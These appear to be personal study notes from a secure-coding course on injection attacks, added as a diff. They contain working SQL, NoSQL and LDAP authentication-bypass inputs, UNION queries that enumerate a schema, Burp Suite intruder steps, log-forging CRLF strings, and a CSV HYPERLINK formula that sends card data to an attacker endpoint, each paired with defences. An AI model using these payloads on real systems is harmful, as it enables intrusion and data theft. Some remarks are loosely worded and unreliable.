@@ -1,0 +1,278 @@
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman
+
+- In this course we will learn about secure coding, specially focussed on injection attacks
+  injection attacks are in top 10 OWASP provided vulnearabilities
+  we will learn how to be write safe code from injection attack vulnerability
+  
+- Just writing secure code is not good enough -> we also need to secure environment where it is runiing
+
+- Go beyond assumptions is first principle of secure coding  
+- Various models to follow
+a. CIA model
+   Confidentiality: sensitive data shall not be seen and should be RBAC controlled
+     only authorized person can view the data
+     If in sql injection someone is hacking and viewing sensitive data from db it is compromising Confidentiality
+   Integrity: unauthorized person can not edit the data, system should detect and control this
+    using sql injection if someone is able to delete or update data it is compromising Integrity
+   Availability: System should be available for legitimate users
+  ddos attack compromise Availability
+
+b. Defense in Depth: Have defensive mechanism in multip0le layers of systems
+  if one layer is breached/compromised  another layer can safeguard  
+c. principle of least priviledege: always give most suited privilidge to users
+   more privildege can compromise security less privilidge can effect daily work
+d. KISS: keep it short and simple   
+e. fail secure: in case of error do not show hidden details but more generic error to customer
+   in logs we can keep this technical details like db error, webservice error and using kibana we can debug this
+   but to api client these details should be hidden
+   
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman
+
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman
+
+- injection attacks are in top 3 security threads listed in OWASP
+  very dangerous security threat for web applications
+  
+- It can lead to data loss, data integrity loss, data theft, denial of service or even complete system failure
+  this occurs when user sends bad data and there is no validation in place to filter bad/dangerous data from user to system
+- Any application that takes input from user and creates command to shell system, db, external systems can be vulnearble to injection attacks 
+  also depending upon level of security in code it can be easy or tough to predict the injection attacks
+  
+- In sample code example with sql created using where clause on username and password at the end
+  if we put password like "user1!'and'1'='1" if password was "user1!"
+  login works  
+  another scenario is to break using postgres sql command option "--"
+  "--" in postgres means break and after this command everything is considered as command
+  so if in user name we keep "user1' --" and any password it will login
+  because in appended sql we have -- and after this we have and query for password which will be skipped
+  hence only select * from user where username is considered : wooh
+  even without password we are able to login 
+  similarly in mysql the command seperator option is "#"
+  so if we put username as: "user1' #" : and clasuse of checking password condition will be skipped  
+  
+  if we do not even know username or password we can still hijack weak code
+  abc/abc will fail but below works
+  abc/abc' or '1'='1 works, as username is abc and password contains abc so or condition is met
+  the above sql query returns all the users and in code we are taking 0th index of this array
+  to solve this we should use sql query with method getsingleresult
+  
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman  
+
+- Similarly for get user info we have get method and query param as user id
+  that means the param userid can be vulnearble to sql injection
+  eg: if we put url as : {url}/user_info?userId=1 union select '1','2','3','4','5'
+  the above sql can get executed and result will not be 1 ,2 ,3,4 ,5 as row element
+  this way i am forcing webapp to return not what is present in db but what i want
+  since i selected union the first row will be the same elements and actual db data wont be returned from API  
+  
+- In case internal error is displayed to customer in api
+  attacker can identify the db used using the response error logs if internal details are shown to APIs
+  then he can use any function that can be dangerous and run as part of this get parameter  
+  another example on extension of above union query
+  {url}/user_info?userId=1 union select '1',table_schema,table_name,'4','5' from information_schema.tables order by 2 offset 69
+  
+- Burp Suite is one of the vulnerability finder tool  
+ Using Burp Suite we can create proxy and intercept , open browser and once we hit any web application
+ it will be intercepted by Burp Suite and we can view request/response and then forward the request
+ Steps:
+ a. Open Burp Suite and select default settings then open proxy and enable interceptor as on
+ b. open the browser and start browing web application to hack
+ c. we can forward the request and also view the request and response
+ d. once a request is selected in http history we can send to intruder
+ e. in intruder section we can make url parameter offset value as dynamic
+    this way we can send multiple requests to application with different offset value in union query
+	in result extractor we can keep schema name and table name
+ f. once attack is started we can see the result for each fo these request and eventually find the table
+   i mean the table where actual data for the application is present 
+ not just the schema name, table name using the same sql injection it can find column names, data type etc
+ then can view this data and even delete this data
+- Not just this even a function/procedure can be created using the same sql vulnerable API
+  example we can create a function that uses postgres commands to read contents of a file to a table
+  so in first step we create a function that takes file name as input and read the file content from system and then saves to table
+  in second step this table data can be read and hence ultimately hacker is able to read system intenral files too  
+  
+- we can seperate 2 or more sql commands using ';'
+  so this way we can actually run more than one command and create a function/procedure  
+  
+- For SQL injection safety using input validation/sanitation 
+  Whitelist approach is better to manage and is more secure than blacklist approach using regex  
+  Whitelist approach is better to manage and is more secure than blacklist approach using regex  
+  
+- Prepared Statements not just provide security from sql injection, it also provide performance benefit
+  as the sql query is same prepared statements query plan can be cached and hence have better performance  
+
+- Make a note that even after using prepared statements we are not safe from running procedure/methods/triggers
+  hence never use stored procdures/methods/triggers  
+  
+- NOSQL injection is similar to SQL injection
+  where user provides input and command is created on server to be executed on NOSQL Engine
+  user can inject dangerous commands and if server do not validates it , the same can be executed in the NOSQL engine
+  causing same problems like SQL injection
+  Since in NOSQL there is no common language as command it depends upon the NOSQL engine provider  
+  the way of hacking NOSQL injection will depend upon the Engine provider
+  but most of the saving techniques are common
+  a. use prepared statements and not string concatenation in mongo query
+  b. whitelist input
+  c. enforce least privilidge
+  d. use NOSQL engine specific secure coding pratisee to generate secure query based on that NOSQL Engine
+  
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman  
+
+- Hacking scenarios in mongodb based nosql injection
+   actual credentials: user1/user1!
+a. username: user1" || "1" == "1
+   password: anything
+   This way we are able to login by just knowing the username and password is not known
+b. username: user1
+   password: user1!" || "1"=="1 
+   This way we are able to login without inserting correct password
+   we know both username and password but by addingn extra things in password we are still able to login
+   we know the username and password but able to login even with wrong password: hack the system
+c. username: anything
+   password: anything" || "1"=="1
+   this will return an array from db(all users) and first user from that array will be used to login   
+d. go to user_info with id
+   {"$regex": ".*", "$options": "i"}
+	http://localhost:8182/user_info?userId={%22$regex%22:%22.*%22,%20%22$options%22:%22i%22}
+    first encode this url using url encdoing tool   
+   this returns all the users from mongo db and then first entry is displayed	
+   
+- Safety preacutions for nosql injection
+a.input validation/sanitation: blacklist and whitelist approach
+   whitelist is better with regex
+b. Use Criteria query instead of where string using BasicQuery
+   this is same like prepared statements or use mongo jpa repository   
+   
+- Injection Attack occurs when user provides dangerous input that gets executed in back end interpreter
+  this input can be part of command or query
+  Simillarly LDAP injection occurs when user supplies dangerous input as part of interpreter
+  that executes the supplied command/query in LDAP engine
+
+- In LDAP we have 2 structure at the top level
+  a. Users: same as user in other dbs like sql/mongo
+  b. Groups: it is same as roles mentioned in other db
+  so user will be present in groups eg: group 1 is ADMIN, group 2 is USER 
+
+execute command in ldap docker container
+ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f C:\Kanishk\learning\spring-security\securecoding-demo-ldap\ldap-injection\src\main\resources\schema\schema.ldif
+command for query the ldap
+a. ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin
+b. ldapsearch -x -H ldap://localhost -b uid=user1,ou=users,dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin
+  
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman
+
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman
+
+- Possible scenarios for LDAP injection
+a. username: *
+   password: *
+   This returns all the users from LDAP and first is selected in code, query: username:*,password:*
+   This can be solved by input validation/sanitation : password should have min 8 chars length and password whitelisting
+b. username: *
+   password: *)(&
+   This creates query: (username:*)&password:*)(&) : last part returns true always as & always returns true
+    hence all the users are returned from the ldap and hence first is selected in code
+in above 2 scenarios we did not know the username or password , first user in ldap will be logged in
+
+c. username: user1
+   password: *)(& 
+   in above we knew the username but with wrong password able to login   
+   
+- Safety measures to prevent LDAP injection
+a. input validation/sanitation
+b. use secure library for LDAP query/command
+   eg: use either spring data ldap interfaces or use LDAP query to escape dangerous commands automatically
+   then run this ldapquery using ldaptemplate
+   
+- Just like other injection attacks in log injection user sends dangerous data 
+  and application recieves it and interpret and put command to log engine
+  this log engine maybe pushing the log to a file or printing to a console  
+  
+- In log injection attacker sends data that can pollute the logs or compromise the system
+  eg: sends input as carriage return, in that case data ihn log file will not be correct
+   : \r\n in input
+  Types
+  a. Log forging: user sends input as false succesful message or passes /n,/r
+    this can lead to wronmg understanding that there is no error
+  b. xss attack: pushes dangerous scripts to logs which then is passed to log file
+     once this is viewede in non secure log viewer can cause xss attacks in browser
+  c. code injection is possible if log file is passed as feed to another application
+
+Vulnerable: Log injection is vulnerable to any application that prints user input into log files
+ anywhere in requestbody, headers, query param, path param, cookies
+ 
+Safety Measures
+a. in user input filter out or replace CRLF params before printing to log
+b. input validation/sanitation
+c. limit the size of log statements
+d. user and specify utf-8 encoding while writing log statements
+e. use frameworks secure fatures like in logback
+f. avoid using tools to view logs that allow running log content as xss attack in browser
+
+om shree ganeshaya namah
+om shree sita rama lakshman hanuman 
+
+- Carriage return is another dangerous log injection in category log forging
+  what it does it completely changes the actual meaning of log
+  can be done using \r or in encoded version '%0D'
+  eg: attacker first finds the success log message, like if user is found in db
+  then he passes wrong userid and use carriage return '%0D' which removes the actual log line and keep cursor at start
+  then that actual statement is replaces by attacker provided message
+  hence it falsely logs into file that task was success when it was actually failure  
+  not just log forging in our code but it can do the same even for oob fraework provided logs
+- Examples
+  actual url: user-info-by-username?username=user1
+  actual success logs: 12:50:59.695 [http-nio-8181-exec-4] INFO  c.l.s.service.UserServiceImpl - Returning user information for user user1
+  actual failure logs: 12:52:50.917 [http-nio-8181-exec-7] ERROR c.l.w.controllers.WebLoginController - Couldn't find user with username: user12
+  
+a. newline charachter: url : user-info-by-username?username=user1%0A%0!
+   this prints normal statement and then inserts 2 empty lines
+   if there is some analytical application that feeds on this log file with pattern, it gives wrong info
+   also log file will get fill more and will look less readable and ugly
+   he can even add any statemtne : user-info-by-username?username=user1%0A%0Aghatiaattacker
+b. carriage return: url : user-info-by-username?username=user1%0D{any log in encoded format}
+  if this is done, the actual log line will be replaced by encoded statement
+  it can be anything, but if attacker knows the success statment, any error statment will be logged by this false success statement
+  it can lead to log forging and false analysis of log files
+c. using carriage return and put script in it
+   the script gets saved in log file and if httponly is false for app
+   if the log viwer is unsafe(httponly is false) it can call the script in background
+   in script it can read cookie like jsessionid and call an api to attacker servie by passing this
+   not if attacker can put local storage cookie jsessionid with this cookie id he can login without username/password
+   but only if httponly is false
+
+- safety measures
+a. input validation/sanitation using whitelist/blacklist
+   do not allow CLRF like /n,/r to be saved in log file
+b. use owasp based logback logger to be safe from lot of threats
+   -> import owasp provided loging logback maven dependency
+   -> in logback.xml use the class provided for appender
+c. keep httponly flag in application yml as true
+   in thymeleaf template use <span th:text="${log_data}"></span> and not
+    not: <span th:utext="${log_data}"></span>   use ht:text and not th:utext
+   
+   
+- How to be safe from CSV file injection attack vulnerability
+a. input validation/sanitation:
+   any cell do not start with +,-,@,tab,carriage,% etc
+b. never insert user provided data directly to csv file
+   first do validation of user input, shall not contain any of above mentioned charachters
+   if validation passes then only save this user input data to csv file
+c. wrap each cell in double quotes
+d. prepend each cell with single quote
+e. escape every double quote with another additional double quote   
+
+- CSV file injection examples
+a. comment: =7*7
+b. use any other dangerous formulae injection:
+   this can compromise the data: man!
+   eg: =C2
+c. hyperlink payload:
+    =HYPERLINK("http://localhost:8999/hack-user-detail?address"&C2&"&creditCardNo="&D2&"","My Web Site!! Click for more info!")   
